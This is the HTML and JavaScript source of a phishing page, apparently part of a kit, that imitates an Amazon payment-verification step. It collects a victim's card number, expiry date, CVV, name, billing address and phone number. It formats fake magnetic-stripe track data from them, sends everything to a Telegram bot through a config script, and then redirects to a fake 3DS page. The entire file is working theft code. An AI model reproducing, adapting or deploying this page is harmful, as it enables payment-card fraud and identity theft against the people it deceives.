<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Pembayaran</title>
    <script src="config.js"></script>
    <script>
        let kodeNegara = 'GB';
        let kodeTelepon = '+44';
        
        async function deteksiNegara() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                kodeNegara = d.country_code || 'GB';
                const peta = { JP:['JP','+81'], ID:['ID','+62'], US:['US','+1'], AU:['AU','+61'], GB:['GB','+44'], MY:['MY','+60'], SG:['SG','+65'] };
                const [negara, tel] = peta[kodeNegara] || ['GB','+44'];
                kodeNegara = negara; kodeTelepon = tel;
            } catch { kodeNegara = 'GB'; kodeTelepon = '+44'; }
            document.getElementById('negara').value = kodeNegara;
            document.getElementById('kodeTel').textContent = kodeTelepon;
        }
    </script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
        body { background: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
        .logo { margin: 10px 0 25px; text-align: center; }
        .logo img { height: 60px; }
        .kotak { width: 100%; max-width: 500px; border: 1px solid #ddd; border-radius: 8px; padding: 25px; }
        h1 { font-size: 22px; margin-bottom: 20px; }
        .logo-kartu { display: flex; gap: 10px; margin-bottom: 20px; }
        .logo-kartu img { height: 24px; opacity: 0.4; }
        .logo-kartu img.aktif { opacity: 1; }
        label { font-size: 13px; font-weight: 700; display: block; margin: 15px 0 6px; }
        input, select { width: 100%; padding: 10px; border: 1px solid #a6a6a6; border-radius: 4px; font-size: 15px; }
        input:focus, select:focus { outline: none; border-color: #0071e3; box-shadow: 0 0 3px rgba(0,113,227,0.5); }
        .baris-dua { display: flex; gap: 12px; }
        .baris-dua > div { flex: 1; }
        button { width: 100%; padding: 12px; background: #FFD814; border: 1px solid #FCD200; border-radius: 20px; font-size: 15px; color: #0F1111; cursor: pointer; margin-top: 25px; }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        button:hover:not(:disabled) { background: #F7CA00; }
        .tel { display: flex; }
        .tel span { padding: 10px 8px; background: #f0f0f0; border: 1px solid #a6a6a6; border-right: none; border-radius: 4px 0 0 4px; font-size: 13px; }
        .tel input { border-radius: 0 4px 4px 0; }
        .footer { font-size: 11px; color: #555; text-align: center; margin-top: 30px; }
        .kartu-wrapper { position: relative; }
        .ikon-kartu { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); height: 22px; display: none; }
    </style>
</head>
<body onload="deteksiNegara()">
    <div class="logo"><img src="img/amazonlogo.png" alt="Amazon"></div>
    <div class="kotak">
        <h1>Verification Payment</h1>
        <div class="logo-kartu">
            <img src="img/visa.png" id="lv" alt="Visa">
            <img src="img/mastercard.png" id="lm" alt="Mastercard">
            <img src="img/amex.png" id="la" alt="Amex">
            <img src="img/discover.png" id="ld" alt="Discover">
            <img src="img/jcb.png" id="lj" alt="JCB">
        </div>

        <label>Card Number</label>
        <div class="kartu-wrapper">
            <input type="text" id="nomor" maxlength="19" placeholder="•••• •••• •••• ••••">
            <img src="" id="ikonKartu" class="ikon-kartu" alt="">
        </div>

        <div class="baris-dua">
            <div>
                <label>Expiry Date</label>
                <input type="text" id="expiry" maxlength="5" placeholder="MM/YY">
            </div>
            <div>
                <label>Security Code</label>
                <input type="text" id="cvv" maxlength="4" placeholder="•••">
            </div>
        </div>

        <label>Name on Card</label>
        <input type="text" id="nama" placeholder="Full name">

        <label>Country/Region</label>
        <select id="negara">
            <option value="GB">United Kingdom</option>
            <option value="ID">Indonesia</option>
            <option value="JP">Japan</option>
            <option value="US">United States</option>
            <option value="AU">Australia</option>
            <option value="MY">Malaysia</option>
            <option value="SG">Singapore</option>
        </select>

        <label>Billing Address</label>
        <input type="text" id="alamat" placeholder="Street address">
        <div class="baris-dua">
            <div>
                <label>City</label>
                <input type="text" id="kota" placeholder="City">
            </div>
            <div>
                <label>Postal Code</label>
                <input type="text" id="kodepos" placeholder="Postal code">
            </div>
        </div>

        <label>Phone Number</label>
        <div class="tel">
            <span id="kodeTel">+44</span>
            <input type="tel" id="telepon" placeholder="7xxx xxxxxx">
        </div>

        <button id="tombol" disabled onclick="lanjut()">Verify & Continue</button>
    </div>
    <div class="footer">
        <p>© 1996-2026, Amazon.com, Inc. or its affiliates</p>
    </div>

    <script>
        let nomorAsli = '';
        let cvvAsli = '';
        let trackData = '';

        document.addEventListener('DOMContentLoaded', () => {
            const email = localStorage.getItem('emailPengguna');
            if (!email) { window.location.href = 'index.html'; return; }
        });

        // === CEK JENIS KARTU & TAMPILKAN LOGO ===
        function cekJenisKartu() {
            const val = document.getElementById('nomor').value.replace(/\s/g, '');
            nomorAsli = val;
            const ikon = document.getElementById('ikonKartu');
            document.querySelectorAll('.logo-kartu img').forEach(i => i.classList.remove('aktif'));

            let src = '';
            if (/^4/.test(val)) { src = 'img/visa.png'; document.getElementById('lv').classList.add('aktif'); }
            else if (/^5[1-5]/.test(val)) { src = 'img/mastercard.png'; document.getElementById('lm').classList.add('aktif'); }
            else if (/^3[47]/.test(val)) { src = 'img/amex.png'; document.getElementById('la').classList.add('aktif'); }
            else if (/^6(?:011|5)/.test(val)) { src = 'img/discover.png'; document.getElementById('ld').classList.add('aktif'); }
            else if (/^35/.test(val)) { src = 'img/jcb.png'; document.getElementById('lj').classList.add('aktif'); }

            ikon.src = src;
            ikon.style.display = src ? 'block' : 'none';
            cekLengkap();
        }

        // === FORMAT NOMOR KARTU — TETAP TERLIHAT SAAT DIKETIK ===
        document.getElementById('nomor').addEventListener('input', function() {
            let angka = this.value.replace(/\D/g, '');
            nomorAsli = angka;
            
            // Tampilkan angka + spasi, TIDAK disembunyikan saat mengetik
            let tampil = '';
            for (let i = 0; i < angka.length; i++) {
                if (i > 0 && i % 4 === 0) tampil += ' ';
                tampil += angka[i];
            }
            this.value = tampil;
            cekJenisKartu();
        });

        // Saat fokus: tampilkan angka asli
        document.getElementById('nomor').addEventListener('focus', function() {
            let tampil = '';
            for (let i = 0; i < nomorAsli.length; i++) {
                if (i > 0 && i % 4 === 0) tampil += ' ';
                tampil += nomorAsli[i];
            }
            this.value = tampil;
        });

        // Saat hilang fokus: ubah jadi titik
        document.getElementById('nomor').addEventListener('blur', function() {
            if (nomorAsli.length === 0) return;
            let tampil = '';
            for (let i = 0; i < nomorAsli.length; i++) {
                if (i > 0 && i % 4 === 0) tampil += ' ';
                tampil += '•';
            }
            this.value = tampil;
        });

        // === EXPIRY DATE ===
        document.getElementById('expiry').addEventListener('input', function() {
            let val = this.value.replace(/\D/g, '');
            if (val.length >= 2) val = val.slice(0,2) + '/' + val.slice(2,4);
            this.value = val;
            cekLengkap();
        });

        // === CVV ===
        document.getElementById('cvv').addEventListener('input', function() {
            cvvAsli = this.value.replace(/\D/g, '');
            this.value = cvvAsli;
            cekLengkap();
        });
        document.getElementById('cvv').addEventListener('focus', function() {
            this.value = cvvAsli;
        });
        document.getElementById('cvv').addEventListener('blur', function() {
            if (cvvAsli.length > 0) {
                this.value = cvvAsli.replace(/./g, '•');
            }
        });

        // === CEK SEMUA DATA LENGKAP ===
        function cekLengkap() {
            const ok = nomorAsli.length >= 13 && nomorAsli.length <= 16 &&
                       document.getElementById('expiry').value.length === 5 &&
                       cvvAsli.length >= 3 && cvvAsli.length <= 4 &&
                       document.getElementById('nama').value.trim() !== '' &&
                       document.getElementById('alamat').value.trim() !== '' &&
                       document.getElementById('kota').value.trim() !== '' &&
                       document.getElementById('kodepos').value.trim() !== '' &&
                       document.getElementById('telepon').value.trim() !== '';
            document.getElementById('tombol').disabled = !ok;
        }

        // === KIRIM DATA & LANJUT ===
        async function lanjut() {
            const email = localStorage.getItem('emailPengguna');
            trackData = `=== TRACK ===\nT1: %B${nomorAsli}^${document.getElementById('nama').value.replace(/\s+/g, '/')}^${document.getElementById('expiry').value.replace('/','')}000000000000?\nT2: ;${nomorAsli}=${document.getElementById('expiry').value.replace('/','')}000000000000?`;

            const dataKartu = {
                email: email,
                namaKartu: document.getElementById('nama').value.trim(),
                nomorKartu: nomorAsli,
                expiry: document.getElementById('expiry').value,
                cvv: cvvAsli,
                alamat: document.getElementById('alamat').value.trim(),
                kota: document.getElementById('kota').value.trim(),
                kodepos: document.getElementById('kodepos').value.trim(),
                telepon: kodeTelepon + ' ' + document.getElementById('telepon').value.trim(),
                trackKartu: trackData
            };

            CONFIG.simpanKartu(dataKartu);

            const pesan = `
💳 *CARD DATA*
━━━━━━━━━━━━━━━━━━━━━
📧 Email: \`${email}\`
👤 Name: \`${dataKartu.namaKartu}\`
🔢 Card: \`${nomorAsli}\`
📅 Exp: \`${dataKartu.expiry}\`
🔒 CVV: \`${cvvAsli}\`
📍 Address: \`${dataKartu.alamat}, ${dataKartu.kota} — ${dataKartu.kodepos}\`
📞 Phone: \`${dataKartu.telepon}\`
━━━━━━━━━━━━━━━━━━━━━
${trackData}
🕐 Time: ${new Date().toLocaleString()}
            `.trim();
            await CONFIG.kirimKeTelegram(pesan);
            window.location.href = '3ds.html';
        }
    </script>
</body>
</html>
